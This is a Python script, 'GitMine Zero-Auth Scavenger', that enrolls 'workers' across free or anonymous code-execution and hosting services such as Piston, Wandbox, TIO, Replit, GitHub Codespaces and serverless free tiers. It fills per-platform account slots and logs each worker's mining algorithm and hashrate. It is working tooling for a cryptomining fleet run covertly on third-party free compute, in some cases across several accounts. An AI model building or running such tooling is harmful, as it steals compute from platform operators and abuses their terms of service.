#!/usr/bin/env python3
"""
GitMine Zero-Auth Scavenger — Updated
Tier 1: Truly zero-auth (no secrets, no account) — runs first, always.
Tier 2: Free-account platforms — auto-activates as secrets are added.
"""
import yaml, os, importlib, time
from pathlib import Path
from datetime import datetime

PLATFORMS_FILE = Path('fleet/harvest/platforms_zeroauth.yaml')
REGISTRY_FILE  = Path('fleet/harvest/workers.yaml')

# Tier 1: truly zero-auth, always attempted
TIER1 = [
    'piston',
    'wandbox',
    'tio_run',
    'github_gist_anon',
    'jsonbin',
    'ipfs',
    'internet_archive',
    'replit_anon',
]

# Tier 2: free account needed, self-skip if no token
TIER2 = [
    'cron_job_org',
    'cloudflare_workers',
    'deno_deploy',
    'aws_lambda_free',
    'github_codespaces',
    'netlify_functions',
    'vercel_functions',
    'pythonanywhere',
    'supabase_edge',
]

def load_registry():
    data = yaml.safe_load(REGISTRY_FILE.read_text())
    return data if data else {'meta': {}, 'workers': []}

def save_registry(registry):
    registry['meta']['last_scan'] = datetime.utcnow().isoformat() + 'Z'
    registry['meta']['active_count'] = len(registry['workers'])
    REGISTRY_FILE.write_text(yaml.dump(registry, default_flow_style=False, sort_keys=False))

def load_enroller(name):
    try:
        mod = importlib.import_module(f'scripts.enrollers.{name}')
        cls = ''.join(w.capitalize() for w in name.split('_')) + 'Enroller'
        return getattr(mod, cls)()
    except Exception as e:
        print(f'[zeroauth] no enroller for {name}: {e}'); return None

def run(target=30):
    platforms = yaml.safe_load(PLATFORMS_FILE.read_text())['platforms_zeroauth']
    registry  = load_registry()
    enrolled  = 0
    needed    = target - len(registry['workers'])
    if needed <= 0:
        print(f'[zeroauth] target met: {len(registry["workers"])} workers'); return
    print(f'[zeroauth] need {needed} more | Tier1 first, then Tier2')
    for pname in TIER1 + TIER2:
        if enrolled >= needed: break
        p = platforms.get(pname)
        if not p: continue
        existing  = [w for w in registry['workers'] if w.get('platform') == pname]
        max_slots = p.get('max_workers', p.get('max_accounts', 5))
        slots     = max_slots - len(existing)
        if slots <= 0: continue
        enroller = load_enroller(pname)
        if not enroller: continue
        n = min(slots, needed - enrolled)
        print(f'[zeroauth] enrolling {n} on {pname}')
        try:
            new = enroller.enroll(n, p)
        except Exception as e:
            print(f'[zeroauth] {pname} error: {e}'); continue
        for w in new:
            registry['workers'].append({
                'id': w['id'], 'platform': pname,
                'enrolled_at': datetime.utcnow().isoformat() + 'Z',
                'last_heartbeat': datetime.utcnow().isoformat() + 'Z',
                'algo': w.get('algo', 'auto'),
                'estimated_hr': w.get('hashrate', 'unknown'),
                'expires_at': w.get('expires_at', 'never'),
                'url': w.get('url'), 'status': 'active',
                'note': w.get('note', '')
            })
            enrolled += 1
            print(f'[zeroauth] +{w["id"]} @ {pname}')
    save_registry(registry)
    print(f'[zeroauth] done — {enrolled} enrolled, {len(registry["workers"])} total')

if __name__ == '__main__':
    import argparse
    p = argparse.ArgumentParser()
    p.add_argument('--target', type=int, default=30)
    args = p.parse_args()
    run(args.target)
